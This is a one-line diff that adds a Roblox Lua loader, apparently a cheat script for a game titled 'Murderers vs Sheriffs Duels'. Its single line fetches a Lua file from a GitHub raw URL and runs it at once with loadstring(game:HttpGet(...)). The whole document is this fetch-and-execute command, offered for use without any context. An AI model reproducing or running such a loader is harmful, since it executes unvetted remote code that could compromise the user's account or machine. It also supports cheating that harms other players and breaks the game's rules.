@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/mvsd-murderers-vs-sheriffs-duels-spam1-amiu4hucl42wbm.lua"))()
